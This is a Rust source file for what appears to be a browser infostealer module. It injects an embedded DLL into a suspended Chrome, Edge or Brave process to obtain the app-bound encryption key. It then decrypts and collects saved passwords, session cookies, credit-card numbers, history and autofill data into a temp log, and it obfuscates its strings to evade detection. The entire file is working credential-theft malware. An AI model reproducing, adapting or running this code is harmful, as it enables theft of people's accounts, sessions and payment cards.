
use anyhow::{Result, Context, bail};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::processthreadsapi::{TerminateProcess, CreateRemoteThreadEx, CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::winbase::{CREATE_SUSPENDED};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::memoryapi::{WriteProcessMemory, VirtualAllocEx};
use winapi::um::winnt::{HANDLE, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use winapi::um::libloaderapi::{GetProcAddress, GetModuleHandleW};
use winapi::um::winbase::{PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE, PIPE_READMODE_BYTE, PIPE_WAIT};
use winapi::um::namedpipeapi::{ConnectNamedPipe, CreateNamedPipeW};
use winapi::um::fileapi::ReadFile;

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;
use hex::decode;

use std::path::{Path, PathBuf};
use std::fs;
use std::env;
use std::io::Write;
use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
use aes_gcm::aead::generic_array::GenericArray;
use rusqlite::{Connection, params};

use crate::obfuscate;
use crate::modules::random::random_name;



const DLL_BYTES: &[u8] = include_bytes!(r"./DllExtractChromiumSecrets/DllMain.dll");

struct Chromium {
    key_path     : String, 
    login_data   : String, 
    history_data : String,
    web_data     : String,
    cookies_data : String,
    app_path     : String,
}

fn find_browser_paths(browser: &str, user: &str) -> Result<Chromium> {
    let user_path = format!("C:\\Users\\{}\\AppData\\Local\\", user);
    // Browser paths obfuscation
    let chrome_app   : &str = &obfuscate!("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
    let chrome_path  : &str = &obfuscate!("Google\\Chrome");
    let edge_app     : &str = &obfuscate!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
    let edge_path    : &str = &obfuscate!("Microsoft\\Edge");
    let brave_app    : &str = &obfuscate!("C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe");
    let brave_path   : &str = &obfuscate!("BraveSoftware\\Brave-Browser");

    let web_data    : &str = &obfuscate!("\\User Data\\Default\\Web Data");
    let history     : &str = &obfuscate!("\\User Data\\Default\\history");
    let cookies     : &str = &obfuscate!("\\User Data\\Default\\Network\\cookies");
    let login_data  : &str = &obfuscate!("\\User Data\\Default\\Login Data");
    let local_state : &str = &obfuscate!("\\User Data\\Local State");
                  
    match browser {
        b if b == obfuscate!("Chrome") => return Ok(Chromium {
            key_path     : format!("{user_path}{chrome_path}{local_state}"),
            login_data   : format!("{user_path}{chrome_path}{login_data}"),
            history_data : format!("{user_path}{chrome_path}{history}"),
            web_data     : format!("{user_path}{chrome_path}{web_data}"),
            cookies_data : format!("{user_path}{chrome_path}{cookies}"),
            app_path     : format!("{chrome_app}"),
            }
        ),
        b if b == obfuscate!("Edge") => return Ok(Chromium {
            key_path     : format!("{user_path}{edge_path}{local_state}"),
            login_data   : format!("{user_path}{edge_path}{login_data}"),
            history_data : format!("{user_path}{edge_path}{history}"),
            web_data     : format!("{user_path}{edge_path}{web_data}"),
            cookies_data : format!("{user_path}{edge_path}{cookies}"),
            app_path     : format!("{edge_app}"),
        }),
        b if b == obfuscate!("Brave") => return Ok(Chromium {
            key_path     : format!("{user_path}{brave_path}{local_state}"),
            login_data   : format!("{user_path}{brave_path}{login_data}"),
            history_data : format!("{user_path}{brave_path}{history}"),
            web_data     : format!("{user_path}{brave_path}{web_data}"),
            cookies_data : format!("{user_path}{brave_path}{cookies}"),
            app_path     : format!("{brave_app}"),
        }),

        _=> bail!("Unsupported!"),

        }    
}

pub  fn dump() -> Result<String> {

    let user = env::var("USERNAME")?;
    let browsers: &[&str] = &[&obfuscate!("Chrome"), &obfuscate!("Edge"), &obfuscate!("Brave")];
    let mut log = String::new();

    for browser in browsers {
        match find_browser_paths(browser, &user) {
            Ok(chromium_data) => {

                log += &format!("\n\n=========== {} ===========\n", &browser);

                if !PathBuf::from(&chromium_data.app_path).exists(){
                    log += &format!("Failed to get data for {}: Invalid path!\n", browser);
                    continue;
                };
                // Derive the V20 key
                let decrypted_key = match derive_v20_master_key(&chromium_data.app_path){
                    Ok(k) => k,
                    Err(e) => {
                        log += &obfuscate!("Failed to get the decrypted v20 master key for : ");
                        log += &format!("{}, {}\n", browser, e);
                        continue;
                    },                     
                };

                // Harvesting browser data after getting the master key

                log += &obfuscate!("\n#### Login Data ####\n");
                let encrypted_logins = match get_login_data(chromium_data.login_data, &decrypted_key){
                        Ok(logins) => log += &logins,
                        Err(e) => {
                            log += &obfuscate!("Failed to get the encrypted passwords for :");
                            log += &format!("{}, {}\n", browser, e);
                            continue;
                        },
                    };

                log += &obfuscate!("\n#### cookies ####\n");
                let encrypted_cookies = match get_cookies_data(chromium_data.cookies_data, &decrypted_key){
                        Ok(cookies) => log += &cookies,
                        Err(e) => {
                            log += &obfuscate!("Failed to get the encrypted cookies for : ");
                            log += &format!("{}, {}\n", browser, e);
                            continue;
                        },
                };

                log += &obfuscate!("\n#### history ####\n");
                let history = match get_history_data(chromium_data.history_data){
                        Ok(h) => log += &h,
                        Err(e) => {
                            log += &obfuscate!("Failed to get history data for :");
                            log += &format!(" {}, {}\n", browser, e);
                            continue;
                        },
                };

                // Web Data 
                let name = random_name();
                let web_temp_path = std::env::temp_dir().join(&name);
                    
                if let Err(e) = fs::copy(chromium_data.web_data, &web_temp_path) {
                    log += &obfuscate!("Failed to copy Web Data database for :");
                    log += &format!("{}, {}\n", browser, e);
                    continue;           
                };

                log += &obfuscate!("\n#### Credit Cards ####\n");
                let credit_cards = match get_credit_cards(&web_temp_path, &decrypted_key){
                        Ok(cards) => log += &cards,
                        Err(e) => {
                            log += &obfuscate!("Failed to get credit cards data for : ");
                            log += &format!("{}, {}\n", browser, e);
                            continue;
                        },
                };

                log += &obfuscate!("\n#### Auto fills ####\n");
                let credit_cards = match get_autofill_data(&web_temp_path){
                        Ok(a) => log += &a,
                        Err(e) => {
                            log += &obfuscate!("Failed to get autofill data for : ");
                            log += &format!("{}, {}\n", browser, e);
                            continue;
                        },
                };
            },

            Err(e) => log += &format!("Error: {}", e),
        }
    }

    let name = "chromium.log";
    let temp_path = std::env::temp_dir().join(name);
    std::fs::write(&temp_path, &log)?;

    Ok(temp_path.to_string_lossy().to_string())
}

fn injector(target: &str, dll_path: &str) -> Result<HANDLE> {

    let mut log = String::new();
    let app_name: Vec<u16> = OsStr::new(target).encode_wide().chain(Some(0)).collect();
    let dll_name: Vec<u16> = OsStr::new(dll_path).encode_wide().chain(Some(0)).collect();

    let dll_name_size = dll_name.len() * std::mem::size_of::<u16>();
    let process_info = create_process(app_name)?;
    
    log += &obfuscate!("\n[*] Created suspended : ");
    log += &format!("'{}: {}'", target, process_info.dwProcessId);
    
    let mem_alloc = unsafe {
        VirtualAllocEx(process_info.hProcess, 
                       ptr::null_mut(),
                       dll_name_size, 
                       MEM_COMMIT | MEM_RESERVE,
                       PAGE_EXECUTE_READWRITE
                       )};
    
    if mem_alloc.is_null() {
        log += &obfuscate!("\n[?] VirtualAllocEx failed : ");
        log += &format!("0x{:08X}",  unsafe {GetLastError()});
        bail!("{log}");

    }
    log += &obfuscate!("\n[*] VirtualAllocEx succeeded:  ");
    log += &format!("{} bytes -> {:p}", dll_name.len() + 1, &mem_alloc);

    let mut bytes_written = 0;
    let result = unsafe {
        WriteProcessMemory(process_info.hProcess,
                           mem_alloc,
                           dll_name.as_ptr() as *const _,
                           dll_name_size,
                           &mut bytes_written
                        )};

    if result == 0 {
        log += &obfuscate!("\n[?] WriteProcessMemory failed : ");
        log += &format!("0x{:08X}", unsafe {GetLastError()});
        bail!("{log}");
    }

    log += &obfuscate!("\n[+] WriteProcessMemory succeeded: ");
    log += &format!("{} bytes -> : {:p}", bytes_written, &mem_alloc);

    let kernel_dll: Vec<u16> = OsStr::new("kernel32.dll").encode_wide().chain(Some(0)).collect();
    
    let kernel32 = unsafe {GetModuleHandleW(kernel_dll.as_ptr())};
    let load_lib_w = unsafe {GetProcAddress(kernel32, "LoadLibraryW\0".as_ptr() as *const i8)};

    if load_lib_w.is_null(){
        let e = unsafe {GetLastError()};
        log += &obfuscate!("\n[?] Failed to get the address of LoadLibraryW : ");
        log += &format!("0x{:08X}", e);
        bail!("{log}");
    }
    
    log += &obfuscate!("\n[*] LoadLibraryW addr: ");
    log += &format!("{:p}", load_lib_w);
    log += &obfuscate!("\n[+] Creating a thread in the remote process ...");

    let hThread = unsafe {
        CreateRemoteThreadEx(process_info.hProcess,
                             ptr::null_mut(),
                             0,
                             Some(std::mem::transmute(load_lib_w)),
                             mem_alloc,
                             0,
                             ptr::null_mut(),
                             ptr::null_mut(),
                            )};

    if hThread.is_null(){
        log += &obfuscate!("\n[?] CreateRemoteThreadEx failed : ");
        log += &format!("0x{:08X}", unsafe {GetLastError()});
        bail!("{log}");
    }
    
    Ok(process_info.hProcess)
}

fn create_process(app_name: Vec<u16>) -> Result<PROCESS_INFORMATION> {
    unsafe {
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        let result = CreateProcessW(
            app_name.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            false as i32,
            CREATE_SUSPENDED,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut startup_info,
            &mut process_info);

        if result == 0 {
            let e = format!("{} {}", obfuscate!("[!] CreateProcessW failed: "), GetLastError());
            bail!(e);
        }    
        Ok(process_info)
    }
}

fn kill_process(hProcess: HANDLE) -> Result<()> {
    unsafe {
        if TerminateProcess(hProcess, 0) == 0 {
            let e = format!("{} {}", obfuscate!("TerminateProcess failed: "), GetLastError());
            bail!(e);
        }
    }
    Ok(())
}

fn extract_dll(bytes: &[u8]) -> Result<String> {
    let dll_name = format!("{}.dll", random_name());
    let dll_path = std::env::temp_dir().join(dll_name);
    if !dll_path.exists()
    // The written file has to be out of scope in order to use it
    {
        let mut file = std::fs::File::create(&dll_path)?;
        file.write_all(bytes)?;
    }

    Ok(dll_path.to_string_lossy().to_string())
}

fn derive_v20_master_key(browser: &str) -> Result<Vec<u8>> {
    // Initiating the log file
    let mut log = String::new();

    let dll_path = match extract_dll(DLL_BYTES) {
        Ok(path) => path,
        Err(e) => bail!(obfuscate!("Failed to extract the DLL file!")),
    };
    log  += &obfuscate!("\n[*] DLL file written to :");
    log  += &dll_path;

    log  += &obfuscate!("\n[*] Creating a named pipe for communication ... ");

    let p_name  = obfuscate!(r"\\.\pipe\xM0kht4r");
    let name: Vec<u16> = OsStr::new(&p_name).encode_wide().chain(Some(0)).collect();
    let hPipe = unsafe { 
        CreateNamedPipeW(
            name.as_ptr() as *mut _,
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            255, 
            4096, 
            4096, 
            0, 
            ptr::null_mut()
            )};

    if hPipe.is_null() {
        log += &obfuscate!("\n[?] CreateNamedPipeW failed: ");
        log += &format!("0x{:08X}", unsafe {GetLastError()});

        bail!("{log}");
    }

    log += &format!("{} {}", &obfuscate!("\n[+] Created a pipe : "), &p_name);
    
    // Inject the browser process!
    let hProcess = match injector(browser, &dll_path) {
        Ok(h) => h,
        Err(e) => {
            log += &format!("{}",e);
            bail!("{log}");
        }
    };

    let result = unsafe {ConnectNamedPipe(hPipe, ptr::null_mut())};
    if result == 0 {
        let e = unsafe {GetLastError()};
        log += &obfuscate!("\n[?] ConnectNamedPipe failed : ");
        log += &format!("0x{:08X}", e);

        bail!("{log}");
    }

    while true {

        let buffer = [0u8; 1024];
        let mut bytes_read = 0;

        let result = unsafe {
            ReadFile(
                hPipe,
                buffer.as_ptr() as *mut _,
                buffer.len() as u32,
                &mut bytes_read,
                ptr::null_mut(),
                )};

        if result == 0 {
            let e = unsafe {GetLastError()};
            log += &obfuscate!("\n[?] ReadFile failed: ");
            log += &format!("0x{:08X}", e);
            break
        }

        let buffer_str = String::from_utf8_lossy(&buffer).to_string();
        if buffer_str.contains("-> key"){
            
            if let Some(key) = buffer_str.split_whitespace().rev().nth(1){
                // Terminate the suspended process
                match kill_process(hProcess) {
                    Ok(_) => {},
                    Err(e) => log += &format!("\n{e}"),
                };

                let key_bytes = decode(key)?;
                return Ok(key_bytes); 
            }
        }
        else if buffer_str.contains("[!]") {
            log += &buffer_str;
            bail!("{}", log);  
        }

    }
    log += &obfuscate!("\n[?] Failed to derive the derypted Master key from the COM interface!");
    // Terminate the suspended process
    match kill_process(hProcess) {
        Ok(_) => {},
        Err(e) => log += &format!("\n{e}"),
    };

    bail!(log);
}

// decrypting data using AES-GCM
fn decrypt_data(encrypted_data: &[u8], key: &[u8]) -> Result<Vec<u8>> {
    if encrypted_data.len() <= 3 || &encrypted_data[0..3] != b"v20" {
        bail!(obfuscate!("Invalid encrypted password format"));
    }

    let iv = &encrypted_data[3..15];
    let ciphertext = &encrypted_data[15..];

    if key.len() != 32 {
        bail!(format!("{}{}", &obfuscate!("Invalid key length: expected 32 bytes, got : "), key.len()));
    }

    if iv.len() != 12 {
        bail!(format!("{}{}", &obfuscate!("Invalid IV length: expected 12 bytes, got : "), iv.len()));
    }

    let key = GenericArray::from_slice(key);
    let nonce = GenericArray::from_slice(iv);
    let cipher = Aes256Gcm::new(key);

    let plaintext = cipher.decrypt(nonce, ciphertext)
        .map_err(|e| anyhow::anyhow!(e))?;

    Ok(plaintext)
}

fn get_login_data(login_data: String, decrypted_key: &[u8]) -> Result<String> {
    let name = random_name();
    let login_temp_path = std::env::temp_dir().join(&name);
                    
    if let Err(e) = fs::copy(login_data, &login_temp_path) {
        bail!(format!("{}{}", &obfuscate!("Failed to copy login database: "), e));          
    };

    let login_data_path = login_temp_path.to_str().context("Failed to convert path to an str!")?;
    let conn = Connection::open(login_data_path)?;

    let sql_login_data : &str = &obfuscate!("SELECT origin_url, username_value, password_value FROM logins");

    let mut stmt = conn.prepare(sql_login_data)?;
    
    let rows = stmt.query_map(params![], |row| {
        let url: String = row.get(0)?;
        let username: String = row.get(1)?;
        let encrypted_password: Vec<u8> = row.get(2)?;
        Ok((url, username, encrypted_password))
    })?;

    let mut logins = Vec::new();
    for row in rows {
        logins.push(row.context("Failed to read row")?);
    }

    let mut data = String::new();
    data += &obfuscate!("\nURL \t Username \t Password");
    data += "\n--- \t -------- \t --------";

    for (url, username, encrypted_value) in logins {
        match decrypt_data(&encrypted_value, &decrypted_key) {
            Ok(password) => {
                let pass_str = String::from_utf8(password)?;
                data += &format!("\n{} \t {} \t {}\n", url, username, pass_str);
            },
            Err(e) => {
                data += &obfuscate!("\nFailed to decrypt password for : ");
                data += &format!("{}: {}\n", url, e);
            }
        }
    }

    Ok(data)
}

fn get_cookies_data(cookies_data: String, decrypted_key: &[u8]) -> Result<String> {
    let name = random_name();
    let cookies_temp_path = std::env::temp_dir().join(&name);
                    
    if let Err(e) = fs::copy(cookies_data, &cookies_temp_path) {
        bail!(format!("{}{}", &obfuscate!("Failed to copy cookies database : "), e));          
    };

    let cookies_data_path = cookies_temp_path.to_str().context("Failed to convert path to an str!")?;
    let conn = Connection::open(cookies_data_path)?;
    
    let sql_cookies : &str = &obfuscate!("SELECT host_key, name, encrypted_value FROM cookies");
    let mut stmt = conn.prepare(sql_cookies)?;

    let rows = stmt.query_map(params![], |row| {
        let hkey: String = row.get(0)?;
        let name: String = row.get(1)?;
        let encrypted_value: Vec<u8> = row.get(2)?;
        Ok((hkey, name, encrypted_value))
    })?;

    let mut cookies = Vec::new();
    for row in rows {
        cookies.push(row.context("Failed to read row")?);
    }

    let mut data = String::new();
    for (hkey, name, encrypted_value) in cookies {
        match decrypt_data(&encrypted_value, &decrypted_key) {
            Ok(cookie) => {
                let cookie_str = &cookie[32..];
                data += &format!("\n{}   {}   {}", hkey, name, String::from_utf8(cookie_str.to_vec())?);
                },
            Err(e) => {
                data += &format!("{}{}, {}", &obfuscate!("\nFailed to decrypt cookie for : "), name, e);
        }   }
    }

    Ok(data)
}

fn get_history_data(history_data: String) -> Result<String> {
    let name = random_name();
    let history_temp_path = std::env::temp_dir().join(&name);
                    
    if let Err(e) = fs::copy(history_data, &history_temp_path) {
        bail!(format!("{}, {}", obfuscate!("Failed to copy history database : "), e));          
    };

    let history_data_path = history_temp_path.to_str().context("Failed to convert path to an str!")?;
    let conn = Connection::open(history_data_path)?;
    let sql_history : &str = &obfuscate!("SELECT url, last_visit_time FROM urls");
    let mut stmt = conn.prepare(sql_history)?;
    
    let rows = stmt.query_map(params![], |row| {
        let url: String = row.get(0)?;
        Ok(url)
    })?;

    let mut history = Vec::new();
    for row in rows {
        history.push(row.context("Failed to read row")?);
    }

    let mut data = String::new();
    for h in history {
        data += &h;
        data += "\n";
    }
    Ok(data)
}


fn get_credit_cards(temp_web_data: &PathBuf, decrypted_key: &[u8]) -> Result<String> {
    
    let web_data_path = temp_web_data.to_str().context("Failed to convert path to an str!")?;
    let conn = Connection::open(web_data_path)?;

    let sql_credit_cards : &str = &obfuscate!("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname FROM credit_cards");
    let mut stmt = conn.prepare(sql_credit_cards)?;
    
    let rows = stmt.query_map(params![], |row| {
        let name: String = row.get(0)?;
        let exp_m: String = row.get(1)?;
        let exp_y: String = row.get(2)?;
        let encrypted_number: Vec<u8> = row.get(3)?;
        let nickname: String = row.get(4)?;
        Ok((name, exp_m, exp_y, encrypted_number, nickname))
    })?;

    let mut encrypted_cards = Vec::new();
    for row in rows {
        encrypted_cards.push(row.context("Failed to read row")?);
    }

    let mut data = String::new();
    data += &obfuscate!("\nName \t expiration_month \t expiration_year \t nickname \t number");
    data += "\n---- \t ---------------- \t --------------- \t -------- \t ------";
    
    for (name, expiration_month, expiration_year, encrypted_number, nickname) in encrypted_cards {
        match decrypt_data(&encrypted_number, &decrypted_key) {
            Ok(num) => {
                let num_str = String::from_utf8(num)?;
                data += &format!("\n{} \t {} \t {} \t {} \t {}", name, expiration_month, expiration_year, nickname, num_str);
            },
            Err(e) => {
                let err = &format!("{}{}, {}", &obfuscate!("Failed to decrypt credit card number for : "), name, e);
                data += err;
            }
        }
    }

    Ok(data)
}

fn get_autofill_data(temp_web_data: &PathBuf) -> Result<String> {
    let web_data_path = temp_web_data.to_str().context("Failed to convert path to an str!")?;
    let conn = Connection::open(web_data_path)?;

    let sql_auto_fill : &str = &obfuscate!("SELECT name, value FROM autofill");
    let mut stmt = conn.prepare(sql_auto_fill)?;
    
    let rows = stmt.query_map(params![], |row| {
        let name: String = row.get(0)?;
        let value: String = row.get(1)?;
        Ok((name, value))
    })?;

    let mut fills = Vec::new();
    for row in rows {
        fills.push(row?);
    }

    let mut data = String::new();
    data += "\nName \t Value";
    data += "\n---- \t -----"; 

    for (name, value) in fills {
        data += &format!("\n{} \t {}", name, value)
    }
    Ok(data)
}